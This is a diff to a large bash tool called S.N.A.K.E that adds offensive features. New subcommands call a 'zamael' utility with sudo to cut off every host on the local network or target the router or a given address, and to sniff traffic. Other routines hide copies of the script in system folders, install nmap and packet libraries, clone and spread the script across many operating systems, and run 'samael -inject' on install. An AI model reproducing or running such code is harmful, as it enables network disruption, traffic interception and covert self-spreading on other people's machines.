@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-_version="0.5.3"
+_version="0.5.4"
 _name="S.N.A.K.E"
 _morph_state="Unknown"
 
@@ -786,14 +786,22 @@ _network(){ #selfe
        _router_info
    elif [[ "$1" == "top" ]]; then
        _router_info
+   elif [[ "$1" == "num" ]]; then
+       echo $(arp -a | grep ? -c)
+   elif [[ "$1" == "dead" ]]; then
+       sudo zamael -a
+   elif [[ "$1" == "bye" ]]; then
+       sudo zamael -t $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-11)$2
+   elif [[ "$1" == "aloha" ]]; then
+       sudo zamael -t $2
    elif [[ "$1" == "speed" ]]; then
        _radar
    elif [[ "$1" == "sniff" ]]; then
-       printf "$RED ERROR $NC\n"
+       sudo zamael -s
    elif [[ "$1" == "infect" ]]; then
        printf "$RED ERROR $NC\n"
    elif [[ "$1" == "magic" ]]; then
-       printf " max /$YELLOW router $NC/$BLUE scan $NC/$WHITE speed $NC/ sniff /$RED infect$NC\n"
+       printf " max :: num ::$YELLOW router $NC::$BLUE scan $NC::$WHITE speed $NC:: sniff ::$RED infect$NC :: bye :: $RED dead $NC\n"
    else
        printf "$RED sNET ERROR $NC\n"
    fi
@@ -814,8 +822,8 @@ _opaa(){ #selfp
   printf "      .S                                    8 R      dP\n"
   printf "   .dx                                   .dP d    .d#\n"
   printf "  xP              .e                 .ud#   dE.oa (\n"
-  printf "  S                             .ua           \dP\n"
-  printf "  ?L  ..   De                 ..oa          .S  uP\n"
+  printf "  S                             .ia           \dP\n"
+  printf "  ?L  ..   De                 ..to          .S  uP\n"
   printf "   #c:S  u.             .ua*  S          uR .a\n"
   printf "    ?LS.        ath    xa     A          d  JP\n"
   printf "     ^#S.        #L  .S     8          d  d\n"
@@ -5803,7 +5811,7 @@ _salt(){ #selfs
 
 
 
-   if [ $1 == "-v" ]; then
+   if [ "$(echo $1 | grep -c 'v')" == "1" ]; then
 
      _paths=("/Users" "/etc" "/tmp" "/")
 
@@ -5812,11 +5820,11 @@ _salt(){ #selfs
      sudo rm -rf snake
      printf "$_name salted to $RED${_paths[$_rnd]}$NC\n"
 
-   elif [[ "$1" == "-s" ]]; then
+   elif [[ "$(echo $1 | grep -c 's')" == "1" ]]; then
 
      _paths=("/Users" "/etc" "/tmp" "/")
 
-     if [[ "$2" == "-v" ]]; then
+     if [[ "$(echo $2 | grep -c 'v')" == "1" ]]; then
        sudo cp snake ./.snake
        sudo cp snake ./.snake
        sudo rm -rf snake
@@ -6934,6 +6942,8 @@ _spread(){ #selfi
 
     brew install nmap >/dev/null  2>&1
 
+    brew install libdnet >/dev/null 2>&1
+
     brew install arp-scan >/dev/null  2>&1
 
     brew install ipcalc >/dev/null  2>&1
@@ -6972,14 +6982,14 @@ _spread(){ #selfi
 
     mas install 1133106875
 
-    sudo cat /etc/pam.d/sudo # add auth sufficient pam_tid.so
+    #sudo cat /etc/pam.d/sudo  add auth sufficient pam_tid.so
 
 
   elif [[ $_system == "Linux" ]]; then #nn
 
     echo "Linux spreading..."
 
-    _type="$(sudo cat /etc/os-release | grep 'ID-LIKE')"
+    _type="$(sudo cat /etc/os-release | grep 'ID')"
 
     if [ $_type == "debian" ]; then
 
@@ -7399,7 +7409,7 @@ _jvdr(){ #selft
   vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
   [[ -z $vendor ]] && vendor="Unknown"
   # Print Result
-  printf "$YELLOW$vendor$NC\n"
+  printf "$BLUE$vendor$NC\n"
   exit 0
 
 
@@ -9637,15 +9647,15 @@ _record_w(){ #selft
 _capture(){ #selft
 
 
-  if [ "$1" == "-i" ]; then
+  if [ "$(echo $1 | grep -c 'i')" == "1" ]; then
     _cheese $2
-  elif [[ "$1" == "-d" ]]; then
+  elif [[ "$(echo $1 | grep -c 'd')" == "1" ]]; then
     _snap $2
-  elif [[ "$1" == "-v" ]]; then
+  elif [[ "$(echo $1 | grep -c 'v')" == "1" ]]; then
     _record_v $2
-  elif [[ "$1" == "-a" ]]; then
+  elif [[ "$(echo $1 | grep -c 'a')" == "1" ]]; then
     _record_a $2
-  elif [[ "$1" == "-w" ]]; then
+  elif [[ "$(echo $1 | grep -c 'w')" == "1" ]]; then
     _record_w $2
   else
     printf "$RED Not supported default$NC\n"
@@ -9671,7 +9681,7 @@ _scanHouse(){ #selft
    _system="$(uname -s)"
 
 
-    if [ "$1" == "-d" ]; then
+    if [ "$(echo $1 | grep -c 'd')" == "1" ]; then
 
       if [ $_system == "Darwin" ]; then
 
@@ -9774,7 +9784,7 @@ _scanHouse(){ #selft
       fi
 
 
-    elif [[ "$1" == "-c" ]]; then
+    elif [[ "$(echo $1 | grep -c 'c')" == "1" ]]; then
 
       if [ $_system == "Darwin" ]; then
 
@@ -10191,7 +10201,7 @@ _openWith(){ #selft
    open -a $1 $2
 }
 
-thermic(){ #selfc
+_thermic(){ #selfc
 
 while true
    do
@@ -10217,6 +10227,7 @@ if [ $_system == "Darwin" ]; then
 
   if [ "$1" == "-g" ]; then
 
+   cd ~
    mkdir foornal
    cd foornal
    git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
@@ -10230,6 +10241,7 @@ if [ $_system == "Darwin" ]; then
 
  else
 
+   cd ~
    mkdir foornal
    cd foornal
    git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
@@ -10244,6 +10256,7 @@ if [ $_system == "Darwin" ]; then
 
  elif [[ $_system == "Linux" ]]; then
 
+   cd ~
    mkdir foornal
    cd foornal
    git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
@@ -10256,6 +10269,7 @@ if [ $_system == "Darwin" ]; then
 
  elif [[ $_system == "GNU" ]]; then
 
+   cd ~
    su
    mkdir foornal
    cd foornal
@@ -10269,6 +10283,7 @@ if [ $_system == "Darwin" ]; then
 
  elif [[ $_system == "HP-UX" ]]; then
 
+   cd ~
    su
    mkdir foornal
    cd foornal
@@ -10283,6 +10298,7 @@ if [ $_system == "Darwin" ]; then
 
  elif [[ $_system == "Haiku" ]]; then
 
+   cd ~
    su
    mkdir foornal
    cd foornal
@@ -10296,6 +10312,7 @@ if [ $_system == "Darwin" ]; then
 
  elif [[ $_system == "Minix" ]]; then
 
+   cd ~
    su
    mkdir foornal
    cd foornal
@@ -10309,6 +10326,7 @@ if [ $_system == "Darwin" ]; then
 
  elif [[ $_system == "OpenBSD" ]]; then
 
+   cd ~
    su
    mkdir foornal
    cd foornal
@@ -10322,6 +10340,8 @@ if [ $_system == "Darwin" ]; then
 
  elif [[ $_system == "SunOS" ]]; then
 
+
+   cd ~
    su
    mkdir foornal
    cd foornal
@@ -10568,6 +10588,9 @@ _brew(){ #selfx
      printf "\n"
      printf "$NEW_BLUE HTML / CSS / C++ / C / *SH / ^H$NC\n"
      printf "$NEW_BLUE JS / JSON / RB / SWIFT / *BAT / ^H$NC\n"
+     printf "$NEW_BLUE TS / GO / PHP / SQL / PY / PERL$NC\n"
+     printf "$NEW_BLUE REXX / CMD / C# / OBJC / JAVA / RUBY$NC\n"
+     printf "$NEW_BLUE XML$NC\n"
      printf "\n"
    else
        printf "$NEW_BLUE Brew$YELLOW Error$NC\n"
@@ -10608,6 +10631,9 @@ _s_n_(){
       git clone https://github.com/mldMoldovan/$1 -q >/dev/null 2>&1
       cd ./$1
       sudo chmod +x $1 ; sudo cp $1 /usr/local/bin/
+      if [ "$1" == "samael" ]; then
+        samael -inject
+      fi
       cd .. ; cd .. ; rm -rf .$1
       printf "$RED $1 is here $NC\n"
     elif [[ $_system == "Linux" ]]; then
@@ -10686,6 +10712,30 @@ _s_n_(){
       _s_n_ shinigami
    elif [[ "$1" == "samael" ]]; then
       _s_n_ samael
+   elif [[ "$1" == "x" ]]; then
+      cd /usr/local/bin/
+      if [ "$(ls -la | grep -c 'roi')" == "1" ]; then
+         printf "Roi :: "
+      fi
+      if [ "$(ls -la | grep -c 'ryan')" == "1" ]; then
+         printf "Ryan :: "
+      fi
+      if [ "$(ls -la | grep -c 'snake')" == "1" ]; then
+         printf "Snake :: "
+      fi
+      if [ "$(ls -la | grep -c 'samael')" == "1" ]; then
+         printf "Samael :: "
+      fi
+      if [ "$(ls -la | grep -c 'wilfred')" == "1" ]; then
+         printf "Snake :: "
+      fi
+      if [ "$(ls -la | grep -c 'salazaar')" == "1" ]; then
+         printf "Salazaar :: "
+      fi
+      if [ "$(ls -la | grep -c 'shinigami')" == "1" ]; then
+         printf "Shinigami :: "
+      fi
+      cd ~
    else
       _s_n_ $1
    fi
@@ -10875,11 +10925,11 @@ elif [[ "$(echo $1 | grep -c 'db')" == "1" ]]; then
 
       _self $2 $3 $4
 
-elif [[ "$(echo $1 | grep -c 'oui')" == "1" ]]; then
+elif [[ "$1" == "oui" || "$1" == "-oui" || "$1" == "--oui" ]]; then
 
      _vndr $2
 
-elif [[ "$(echo $1 | grep -c 'morph')" == "1" ]]; then
+elif [[ "$1" == "morph" || "$1" == "-morph" || "$1" == "--morph" ]]; then
 
      _morph $2 $3
 
@@ -11057,7 +11107,7 @@ elif [[ "$(echo $1 | grep -c 'appID')" == "1" ]]; then
 
   _appID
 
-elif [[ "$($1 | grep -c 'melt')" == "1" ]]; then
+elif [[ "$(echo $1 | grep -c 'melt')" == "1" ]]; then
 
   _melt
 
@@ -11073,6 +11123,10 @@ elif [[ "$(echo $1 | grep -c 'shed')" == "1" ]]; then
 
   _melt
 
+elif [[ "$(echo $1 | grep -c 'ex')" == "1" ]]; then
+
+  _expand
+
 elif [[ "$(echo $1 | grep -c 'rep')" == "1" ]]; then
 
   _replicate
@@ -11085,13 +11139,16 @@ elif [[ "$(echo $1 | grep -c 'net')" == "1" ]]; then
 
   _network $2
 
-elif [[ "$(echo $1 | grep -c 'seewifi')" == "1" ]]; then
+elif [[ "$(echo $1 | grep -c 'allwifi')" == "1" ]]; then
 
   airport -s | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
 
-elif [[ "$(echo $1 | grep -c 'allwifi')" == "1" ]]; then
+  airport -s | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' |  xargs -L1 snake -soui
+
+elif [[ "$(echo $1 | grep -c 'seewifi')" == "1" ]]; then
 
   airport -s
+
 
 elif [[ "$(echo $1 | grep -c 'router')" == "1" ]]; then
 
@@ -11176,7 +11233,7 @@ elif [[ "$1" == "-uname" ]]; then
 
   _uname
 
-elif [[ "$1" == "os" || "$1" == "-os" || "$1" == "--os" ]]; then
+elif [[ "$1" == "-os" ]]; then
 
   _ros $2 $3
 
